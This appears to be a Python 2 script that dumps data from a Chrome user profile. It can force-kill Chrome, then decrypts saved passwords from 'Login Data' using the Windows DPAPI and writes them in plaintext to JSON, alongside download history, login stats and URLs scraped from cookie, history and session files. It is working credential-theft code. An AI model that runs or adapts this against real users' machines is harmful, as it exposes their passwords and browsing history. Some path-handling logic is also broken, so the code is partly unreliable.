import sqlite3
import argparse
import os

import errno
from pandas import read_sql_query
from re import findall
import psutil
from difflib import SequenceMatcher
import win32crypt
import json
import platform
import time
import logging
import sys

log = logging.getLogger(__name__)
out_hdlr = logging.StreamHandler(sys.stdout)
out_hdlr.setFormatter(logging.Formatter('%(asctime)s %(message)s'))
out_hdlr.setLevel(logging.INFO)
log.addHandler(out_hdlr)
log.setLevel(logging.INFO)


def investigate_dbs(terminate_chrome, deep):
    log.info('INVESTIGATE CHROME DBS')
    current_time = time.strftime("%H-%M-%S_%d-%m-%Y")
    if not os.path.exists(current_time):
        try:
            log.info('CREATING FOLDER: {}'.format(os.path.join(os.getcwd(), current_time)))
            os.makedirs(current_time)
        except OSError as exc:
            if exc.errno != errno.EEXIST:
                raise
    if terminate_chrome:
        log.info('TERMINATE CHROME')
        kill_process()
    chrome_dbs_path = get_dbs_path()
    log.info('DUMP DOWNLOADS')
    dump_downloads(path=chrome_dbs_path, output=os.path.join(current_time, 'chrome_downloads.json'))
    log.info('DUMP USER PASS')
    dump_user_pass(path=chrome_dbs_path, output=os.path.join(current_time, 'chrome_user_pass.json'))
    log.info('DUMP USERS')
    dump_users(path=chrome_dbs_path, output=os.path.join(current_time, 'chrome_users.json'))

    if deep:
        log.info('GENERATE CHROME FILES')
        chrome_files = generate_all_files(path=chrome_dbs_path)
        log.info('GENERATE URLS - DEEP')
        urls = generate_urls(path=chrome_dbs_path, files=chrome_files)
    else:
        chrome_db_files = ['History', 'Favicons', 'Cookies', 'Top Sites',
                           'Visited Links', 'Web Data', 'Shortcuts', 'Last Session',
                           'Last Tabs', 'Network Action Predictor', 'Current Tabs',
                           'Preferences', 'Current Session', 'TransportSecurity',
                           'TransportSecurity', 'Login Data', 'Origin Bound Certs',
                           'Bookmarks', 'QuotaManager', 'Extension Cookies']
        log.info('GENERATE URLS - NORMAL')
        urls = generate_urls(path=chrome_dbs_path, files=chrome_db_files)

    log.info('DUMP URLS')
    dump_urls(urls=urls, output=os.path.join(current_time, 'chrome_urls.json'))


def generate_all_files(path):
    chrome_files = set([])
    for root, dirs, files in os.walk(path):
        chrome_files = chrome_files.union(files)
    return chrome_files


def dump_user_pass(path, output):
    with open(output, 'w') as f:
        data = ([], [])
        conn = sqlite3.connect(os.path.join(path, 'Login Data'))
        cursor = conn.cursor()
        cursor.execute(
            'SELECT username_value, action_url, times_used, signon_realm, origin_url, password_element, password_value, date_created FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[6], None, None, None, 0)[1]
            if password:
                result = list(result)
                result.pop(6)
                result.insert(6, password)
                data[0].append(result)
            else:
                result = list(result)
                result.pop(6)
                data[1].append(result)
        f.write(json.dumps(data))
        f.flush()


def dump_users(path, output):
    with open(output, 'w') as f:
        conn = sqlite3.connect(os.path.join(path, 'Login Data'))
        cursor = conn.cursor()
        cursor.execute(
            'SELECT username_value, update_time, origin_domain FROM stats')
        data = cursor.fetchall()
        f.write(json.dumps(data))
        f.flush()


def dump_downloads(path, output):
    with open(output, 'w') as f:
        db_path = os.path.join(path, 'History')
        conn = sqlite3.connect(db_path)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT tab_url, http_method, opened, site_url, last_access_time, start_time, tab_referrer_url, last_modified, by_ext_name, original_mime_type, referrer, current_path, target_path, transient FROM downloads')
        data = cursor.fetchall()
        f.write(json.dumps(data))
        f.flush()


def dump_urls(urls, output):
    with open(output, 'w') as f:
        for url in urls:
            f.write('{}\n'.format(url))


def fuzzy_search(name1, name2, strictness):
    similarity = SequenceMatcher(None, name1, name2)
    return similarity.ratio() > strictness


def kill_process():
    process_names = ['chrome.exe', 'chrome']
    for p in psutil.process_iter():
        for p_name in process_names:
            try:
                if p.name() == p_name:
                    p.kill()
            except psutil.NoSuchProcess:
                # unknown problem
                log.info("PSUUTIL.NOSUCHPROCESS")
                continue


def get_dbs_path():
    path_win_10_post2008 = os.path.join('C:\\', 'Users', os.getenv('username'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
    path_win_7 = os.path.join('C:\\', 'Users', os.getenv('username'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
    path_win_xp = os.path.join('C:\\', 'Documents and Settings', os.getenv('username'), 'Application Support', 'Google', 'Chrome', 'Default')
    path_mac_os_x = '~/Library/Application Support/Google/Chrome/Default/'
    path_linux = '~/.config/google-chrome/Default/'
    system_name = platform.system().upper()
    if 'JAVA' in system_name:
        return None
    if 'WINDOWS' in system_name:
        system_name += platform.release().upper()
    return {
        'WINDOWSPOST2008SERVER': path_win_10_post2008,
        'WINDOWS10': path_win_10_post2008,
        'WINDOWS8.1': path_win_10_post2008,
        'WINDOWS8': path_win_10_post2008,
        'WINDOWS7': path_win_7,
        'WINDOWSVISTA': path_win_7,
        'WINDOWSXP': path_win_xp,
        'MACOS': path_mac_os_x,
        'LINUX': path_linux
    }.get(system_name, 'WINDOWS10')


def generate_urls(path, files):
    urls = set([])
    counter = 0
    for f in files:
        try:
            counter += 1
            if not (counter % (len(files) / 10)):
                log.info("GENERATE URLS: {}%".format((float(counter) / len(files)) * 100))
            db = sqlite3.connect(os.path.join(path, f))
            cursor = db.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            for table_name in tables:
                table_name = table_name[0]
                table = read_sql_query("SELECT * from %s" % table_name, db)
                new_urls = findall(r"(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\S]*)\/?", table.to_string())
                urls = urls.union(new_urls)
                # log.info('File:{:15}Success'.format(f))
        except sqlite3.DatabaseError, e:
            log.info('GENERATE URLS: {:30}File: {:30}Failed: {:30}'.format(str((float(counter) / len(files)) * 100) + '%', f, e))
            # log.info("GENERATE URLS: {}%".format(100.0))
    return urls


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Dump information from Google-Chrome browser databases')
    parser.add_argument('-k', '--kill-browser', help='terminate chrome process', required=False,
                        dest='terminate_chrome',
                        action='store_true')
    parser.add_argument('-d', '--deep', help='deep inspection', required=False, dest='deep',
                        action='store_true')

    
    investigate_dbs(**vars(parser.parse_args()))
